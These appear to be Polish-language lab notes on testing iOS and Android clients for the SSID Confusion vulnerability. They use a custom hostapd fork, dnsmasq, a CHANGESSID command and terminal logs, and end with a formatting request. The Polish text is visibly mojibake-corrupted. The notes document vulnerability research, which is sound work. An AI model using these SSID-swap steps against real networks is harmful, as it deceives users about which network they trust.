## **Proces konfiguracji AP z uÅ¼yciem custom hostapd z [repozytorium](https://github.com/vanhoefm/ssid-confusion-hostap/tree/main/hostapd):**

### **Co zostaÅ‚o osiÄ…gniÄ™te - skrÃ³t:**

1. **Konfiguracja karty sieciowej:**

   * Kluczowe krotki, wyÅ‚Ä…czenie NetworkManagera, Wprowadzenie karty w tryb AP,
2. **Kompilacja niestandardowej wersji hostapd:**

   * UdaÅ‚o siÄ™ zbudowaÄ‡ hostapd na podstawie niestandardowego pliku konfiguracyjnego `.config` - do gÅ‚Ä™bszej analizy (wiÄ™cej opisane niÅ¼ej)
3. **Uruchomienie Access Pointa:**

   * Konfiguracja `hostapd_test.conf`
4. **Konfiguracja i uruchomienie serwera DHCP:**

   * Dla niektÃ³rych clientÃ³w wymogiem jest otrzymanie adresu IP Å¼eby pozostaÄ‡ w poÅ‚Ä…czeniu
   * Konfiguracja `dnsmasq.conf`
5. **PoÅ‚Ä…czenie clientÃ³w i test podatnoÅ›ci:**

   * Wariant 1 - Standard attack
   * Wariant 2 - Optimized attack

---

### **Napotkany Problem:**

**Autoryzacja przez RADIUS**:
Mimo wyÅ‚Ä…czenia wszystkich (przez nas znalezionych) ustawieÅ„ RADIUS w pliku `.config`, logi jasno wskazujÄ… na prÃ³bÄ™ autoryzacji klienta przy uÅ¼yciu RADIUS:

**`wlo1: STA 6e:69:91:91:90:fd RADIUS: starting accounting session 18A9B916F883346D`**

**QoL - Skrypty bashowe pomagajÄ… w szybszej konfiguracji badania** ğŸ”¥:

* [setup_ap.sh](https://drive.google.com/file/d/15FMKWGcLx979fs5PJ-BB_oi0xF8va8OX/view?usp=drive_link)
* [setup_dhcp.sh](https://drive.google.com/file/d/1r8lDpNylK4h0lKeiwcDrpgFBotY3jQj3/view?usp=drive_link)
* [revoke_services.sh](https://drive.google.com/file/d/1llO09_dqio9GamihEuTd5A3k-7ntplFN/view?usp=drive_link)
* Fork [repozytorium](https://github.com/maciej-klimek/ssid-confusion-hostap) z dotychczasowymi postÄ™pemi w badaniu.

### **Przebieg Badania PodatnoÅ›ci**

1. **Stworzenie serwera DHCP:**

```bash
atis@atis-Latitude-5420:~/Desktop/ssid/ssid-confusion-hostap/hostapd$ sudo ./setup_dhcp.sh
Setting up dnsmasq configuration
dnsmasq configuration written to dnsmasq.conf
Starting dnsmasq with configuration: dnsmasq.conf
dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.100.10 -- 192.168.100.200, lease time 8h
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 127.0.0.53#53
dnsmasq: read /etc/hosts - 8 names

dnsmasq-dhcp: DHCPDISCOVER(wlp0s20f3) ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPOFFER(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPDISCOVER(wlp0s20f3) ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPOFFER(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPREQUEST(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPACK(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
```

2. **Konfiguracja AP i Stworzenie *â€œBaseNetâ€*** - podÅ‚Ä…czenie uÅ¼ytkownika do sieci:

```bash
atis@atis-Latitude-5420:~/Desktop/ssid/ssid-confusion-hostap/hostapd$ sudo ./hostapd hostapd_test.conf
wlp0s20f3: interface state UNINITIALIZED->ENABLED
wlp0s20f3: AP-ENABLED
wlp0s20f3: STA ce:30:57:8e:78:77 IEEE 802.11: authenticated
wlp0s20f3: STA ce:30:57:8e:78:77 IEEE 802.11: associated (aid 1)
wlp0s20f3: AP-STA-CONNECTED ce:30:57:8e:78:77
wlp0s20f3: STA ce:30:57:8e:78:77 RADIUS: starting accounting session BAC8A9A46C9E7BFB
```

![iphone-ss](images/iphone-ss.png)

> Screenshot z urzÄ…dzenia IOS podÅ‚Ä…czonego do sieci z przypisanym adresem IP

```bash
dnsmasq-dhcp: DHCPDISCOVER(wlp0s20f3) ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPOFFER(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPDISCOVER(wlp0s20f3) ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPOFFER(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPREQUEST(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
dnsmasq-dhcp: DHCPACK(wlp0s20f3) 192.168.100.85 ce:30:57:8e:78:77
```

3. **Podmiana SSID w trakcie kiedy uÅ¼ytkownik jest podÅ‚Ä…czony do *â€œBaseNetâ€*.** `connectedssid -> changedssid`

```bash
atis@atis-Latitude-5420:~/Desktop/ssid/ssid-confusion-hostap/hostapd$ sudo ./hostapd_cli -p wpaspy_ctrl raw "CHANGESSID changedssid"
Selected interface 'wlp0s20f3'
OK
```

4. **Mimo zmiany SSID, klient IOS dalej zostaje poÅ‚Ä…czony do sieci *â€œBaseNetâ€*, jedyna zmiana jakÄ… to nowÄ… dostÄ™pna sieÄ‡ *â€œChangedNetâ€***

```bash
atis@atis-Latitude-5420:~/Desktop/ssid/ssid-confusion-hostap/hostapd$ ping 192.168.100.85
PING 192.168.100.85 (192.168.100.85) 56(84) bytes of data.
64 bytes from 192.168.100.85: icmp_seq=1 ttl=64 time=18.7 ms
64 bytes from 192.168.100.85: icmp_seq=2 ttl=64 time=2.81 ms
64 bytes from 192.168.100.85: icmp_seq=3 ttl=64 time=85.2 ms
64 bytes from 192.168.100.85: icmp_seq=4 ttl=64 time=86.2 ms
64 bytes from 192.168.100.85: icmp_seq=5 ttl=64 time=109 ms
64 bytes from 192.168.100.85: icmp_seq=6 ttl=64 time=28.9 ms
64 bytes from 192.168.100.85: icmp_seq=7 ttl=64 time=52.6 ms
â€¦
--- 192.168.100.85 ping statistics ---
26 packets transmitted, 26 received, 0% packet loss, time 25038ms
rtt min/avg/max/mdev = 2.365/57.484/109.894/35.192 ms
```

Ponadto klient zachowuje **peÅ‚nÄ… komunikacjÄ™ z AP** (przykÅ‚ad: ping powyÅ¼ej)

5. **Wnioski** `-` Klient IOS nie zauwaÅ¼a zmiany SSID - moÅ¼na go uznaÄ‡ za podatnego na zagroÅ¼enie SSID Confusion

### **Zestawienie**

Badanie podatnoÅ›ci na kliencie **Android 14.0**

1. **Standard Attack:**

   * Po uruchomieniu AP klient otrzymuje probe responsy ***â€œBaseNetâ€***, moÅ¼e siÄ™ z niÄ… poÅ‚Ä…czyÄ‡.
   * Przy symulacji ataku (zmianie SSID za pomocÄ… komendy hostapd `FAKESSID`) klient zaczyna otrzymywaÄ‡ â€œzmienioneâ€  probe responsy - moÅ¼e siÄ™ poÅ‚Ä…czyÄ‡ z sieciÄ… ***â€œChangedNetâ€***.

   **Wniosek** - nie da siÄ™ wyciÄ…gnÄ…Ä‡ poniewaÅ¼ podatnoÅ›Ä‡ moÅ¼na stwierdziÄ‡ tylko wtedy kiedy client przeprowadzi procedure *group key handshake* z AP. W naszych testach hostapd dokonywaÅ‚ uwierzytelnienia klienta poprzez RADIUS - nie udaÅ‚o nam siÄ™ nadpisaÄ‡ tej konfiguracji. Wynik eksperymentu jedynie moÅ¼e sugerowaÄ‡ Å¼e klient jest podant w kontekÅ›cie sieci Enterprise. *Temat pozostaje do dalszych badaÅ„.*

2. **Optimized Attack**

   * zmiana SSID podczas gdy klient utrzymuje poÅ‚Ä…czenie z *â€œ**BaseNetâ€***.
     Wynik -   klient zostaje natychmiast **rozÅ‚Ä…czony** z sieciÄ…, po chwili otrzymuje nowe *zmienione* probe responsy od sieci â€œ***ChangedNetâ€***

   **Wniosek** - klient **nie wykazuje** podatnoÅ›ci. Zmiana SSID powoduje natychmiastowe rozÅ‚Ä…czenie z sieciÄ…, moÅ¼emy wiÄ™c wnioskowaÄ‡ Å¼e po stronie klienta wystÄ™puje ciÄ…gÅ‚e sprawdzanie SSID w odbieranych ramkach

Badanie podatnoÅ›ci na kliencie **IOS 17.6.1** oraz **18.1.1**:

1. **Standard Attack -** Identyczna sytuacja jak w przypadku Android 14.0 - nie moÅ¼na wyciÄ…gnÄ…Ä‡ jednoznacznych wnioskÃ³w

2. **Optimized Attack**

   * zmiana SSID podczas gdy klient utrzymuje poÅ‚Ä…czenie z *â€œ**BaseNetâ€***.
     Wynik - klient zostaje **pozostaje podÅ‚Ä…czony do starej sieci** oraz po krÃ³tkiej chwili wykrywa nowÄ… sieÄ‡ â€œ***ChangedNet*** â€œ. Ponadto zachowana jest peÅ‚na Å‚Ä…cznoÅ›Ä‡ miÄ™dzy klientem a AP (przykÅ‚ad - ping)

   **Wniosek** - klient **wykazuje** podatnoÅ›Ä‡. Zmiana SSID nie powodujÄ™ rozÅ‚Ä…czenia clienta od sieci *â€œ**BaseNetâ€***, zachowuje on peÅ‚nÄ… komunikacjÄ™ z AP moÅ¼na to udowniÄ‡ za pomocÄ… komendy ping. W chwili zmiany SSID widoczna jest nowa sieÄ‡ â€œ***ChangedNet*** â€œ wiÄ™c moÅ¼emy wnioskowaÄ‡, Å¼e nie wystÄ™puje ciÄ…gÅ‚e sprawdzanie SSID w odbieranych ramkach przez klienta.

### **ToDo:**

- [ ] Testy urzÄ…dzeÅ„ android i ios na jednym, identycznie skonfigurowanym hostapd AP - sprawdzenie czy wyniki badaÅ„ sÄ… takie same
- [ ] DogÅ‚Ä™bna analiza problemu z autoryzacjÄ… przez serwer RADIUS - nasze moÅ¼liwoÅ›ci ogranicza bardzo uboga i chaotyczna dokumentacja repozytorium ale moÅ¼na podjÄ…Ä‡ prÃ³by dokÅ‚adniejszego wczytania siÄ™ w kod/pliki konfiguracyjne
- [ ] PrzeanalizowaÄ‡ [wpa_supplicant](https://github.com/vanhoefm/ssid-confusion-hostap/tree/main/wpa_supplicant) - Planujemy wykorzystaÄ‡ stworzonego supplicanta do poÅ‚Ä…czenia siÄ™ z sieciÄ… utworzonÄ… za pomocÄ… hostapd, co pozwoli nam rozwiÄ…zaÄ‡ problem z Radiusem oraz sprawdziÄ‡ podatnoÅ›ci WPA

tutaj jak sa te bloki output z terminala to mi je zamknij w jeden duzy blok a nie kazda linia jako ` `

NIC INNEGO NIE ZMIENIAJ
